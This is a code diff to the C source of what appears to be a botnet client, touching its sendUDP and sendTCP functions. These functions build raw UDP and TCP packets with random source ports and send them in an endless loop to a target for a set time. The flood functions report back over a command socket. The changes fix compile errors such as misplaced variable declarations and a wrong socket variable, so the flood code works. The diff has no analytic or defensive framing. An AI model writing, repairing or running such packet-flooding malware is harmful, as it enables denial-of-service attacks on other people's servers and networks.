@@ -974,9 +974,11 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
         if(getHost(target, &dest_addr.sin_addr)) return;
         memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
 
+	register unsigned int i = 0;
         register unsigned int pollRegister;
         pollRegister = pollinterval;
         head = NULL;
+	struct  list *list_node;
 	FILE *ips = fopen("ips.txt","r");
         int max_len = 128;
 	char *buffer = (char *) malloc(max_len);
@@ -1022,7 +1024,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                 }
                 memset(&ifr, 0, sizeof(ifr));
                 snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
-                if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
+                if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
                        sockprintf(mainCommSock, "Error binding to interface.");
                 }
                 int counter = 50;
@@ -1047,7 +1049,6 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                 iph->check = csum ((unsigned short *) packet, iph->tot_len);
 
                 int end = time(NULL) + timeEnd;
-                register unsigned int i = 0;
                 while(1)
                 {
                         udph->source = htons(rand() % 65535 - 1026);
@@ -1079,6 +1080,8 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
         if(getHost(target, &dest_addr.sin_addr)) return;
         memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
 
+	register unsigned int i = 0;
+	struct  list *list_node;
         register unsigned int pollRegister;
         pollRegister = pollinterval;
         head = NULL;
@@ -1127,7 +1130,7 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
         }
         memset(&ifr, 0, sizeof(ifr));
         snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
-        if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
+        if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
                sockprintf(mainCommSock, "Error binding to interface.");
         }
         unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
@@ -1181,7 +1184,7 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
         iph->check = csum ((unsigned short *) packet, iph->tot_len);
 
         int end = time(NULL) + timeEnd;
-        register unsigned int i = 0;
+        
         while(1)
         {
                 sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
